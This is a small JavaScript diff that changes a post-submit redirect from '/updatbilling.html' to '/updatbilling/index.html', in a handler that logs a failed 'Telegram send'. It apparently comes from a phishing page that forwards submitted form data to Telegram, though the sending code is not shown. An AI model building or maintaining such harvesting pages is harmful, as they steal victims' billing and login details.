@@ -42,7 +42,7 @@ document.addEventListener("DOMContentLoaded", () => {
         } catch (err) {
             console.error("Telegram send failed:", err);
         } finally {
-            window.location.href = "/updatbilling.html";
+            window.location.href = "/updatbilling/index.html";
         }
     });
 });
